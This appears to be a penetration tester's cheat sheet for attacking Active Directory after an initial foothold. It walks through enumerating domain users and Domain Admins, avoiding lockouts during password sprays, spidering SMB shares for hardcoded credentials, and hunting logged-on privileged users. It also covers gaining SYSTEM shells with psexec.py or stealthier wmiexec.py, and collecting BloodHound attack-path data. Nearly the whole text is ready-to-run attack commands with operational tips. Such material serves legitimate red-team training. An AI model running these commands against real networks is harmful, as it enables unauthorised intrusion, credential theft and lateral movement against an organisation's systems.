1. Gain foothold and acquire at least one set of domain credentials or **SYSTEM** access
2. Map domain users and groups to identify high-value targets and avoid account lockouts via **badPwdCount**
3. Enumerate shares and spider contents for hardcoded credentials in scripts or config files
4. Hunt for active sessions to find where privileged users like Domain Admins are logged in
5. If **local administrator privileges** are identified, use Impacket modules for RCE to harvest credentials or pivot
6. Execute BloodHound ingestion to visualize complex attack paths and **nested group membership**

---

## Domain Object Enumeration

When to use: Foothold established; need target lists, **badPwdCount** attributes, or group memberships

Dump all domain users and their lockout-related attributes

```
sudo crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --users
```

List all domain groups and member counts to identify privileged IT or executive groups

```
sudo crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --groups
```

Identify members of the Domain Admins group via LDAP

```
python3 windapsearch.py --dc-ip <DC_IP> -u <USERNAME>@<DOMAIN> -p <PASSWORD> --da
```

Perform recursive lookups to find users with **nested group membership** in privileged groups

```
python3 windapsearch.py --dc-ip <DC_IP> -u <USERNAME>@<DOMAIN> -p <PASSWORD> -PU
```

Start an interactive session for manual object manipulation or enumeration

```
rpcclient -U "<USERNAME>" <TARGET_IP>
```

List all domain users and their associated RIDs inside an rpcclient session

```
enumdomusers
```

Query specific user details using a hex RID (e.g., 0x1f4 for built-in Administrator)

```
queryuser <RID>
```

- Tool comparison
    
    - CrackMapExec -> `crackmapexec smb <DC_IP> --users` -> prefer for quick user lists and lockout auditing
    - Windapsearch -> `windapsearch.py -PU` -> prefer for uncovering hidden privileges via **nested group membership**
    - rpcclient -> `queryuser <RID>` -> prefer for granular object attribute inspection or manual AD interaction
- **badPwdCount > 0**: indicates recent failed login attempts; skip these during password sprays to prevent lockouts
    
- Gotchas
    
    - **CME commands must be prefaced with sudo**

## Share and File Discovery

When to use: Identifying accessible storage and pillaging files for sensitive data or configuration secrets

Check share permissions (READ/WRITE) for the current user across the domain

```
smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <TARGET_IP>
```

Recursively list only directories to map share structure without file clutter

```
smbmap -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -H <TARGET_IP> -R <SHARE_NAME> --dir-only
```

Spider a specific share and generate a JSON index of all readable files

```
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -M spider_plus --share <SHARE_NAME>
```

View the first lines of the spider results to identify interesting files like web.config or .bat scripts

```
head -n 10 /tmp/cme_spider_plus/<TARGET_IP>.json
```

- Tool comparison
    
    - SMBMap -> `smbmap -R --dir-only` -> prefer for initial filesystem mapping and permission auditing
    - CME spider_plus -> `-M spider_plus` -> prefer for automated pillaging and creating a searchable file index
- **READ access to SYSVOL/NETLOGON**: default in most domains; check for scripts or legacy GPO files
    
- Gotchas
    
    - **Spider results are stored in /tmp/cme_spider_plus/**; they do not output directly to the terminal

## User Session Hunting

When to use: Identifying hosts where privileged users are active for potential credential harvesting from memory

List users currently logged into a specific target host

```
sudo crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --loggedon-users
```

- **Pwn3d!** suffix in CME output: confirms the provided credentials have **local administrator privileges** on the target
    
- Edge cases
    
    - Use BloodHound for graphical session hunting across the entire domain if manual CME checks are too slow

## Remote Code Execution

When to use: Confirmed **local administrator privileges** on a target; need a shell for post-exploitation

Obtain an interactive shell as **SYSTEM** via a remote service

```
psexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

Execute commands through WMI for a stealthier, fileless approach in the context of the user

```
wmiexec.py <DOMAIN>/<USERNAME>:'<PASSWORD>'@<TARGET_IP>
```

- Tool comparison
    
    - psexec.py -> uploads executable to **ADMIN$** -> prefer when **SYSTEM** access is required for credential dumping
    - wmiexec.py -> WMI-based semi-interactive -> prefer for stealth as it avoids dropping files to disk
- Gotchas
    
    - **psexec.py is highly noisy** and creates a service that leaves artifacts on the host
    - **wmiexec.py shell is semi-interactive**; each command spawns a new process, losing environmental state

## Graph-Based AD Analysis

When to use: Mapping complex attack paths and visualizing domain relationships that manual tools miss

Collect all domain data (Groups, LocalAdmin, Sessions, Trusts, ACLs) from a Linux host

```
sudo bloodhound-python -u <USERNAME> -p <PASSWORD> -ns <DC_IP> -d <DOMAIN> -c all
```

- **JSON output files**: these must be zipped and manually uploaded to the BloodHound GUI for analysis

> ⚠️ Gap: Standard domain users may lack permissions to enumerate certain collection methods (like LoggedOn or Session) depending on host-level protections or GPOs.













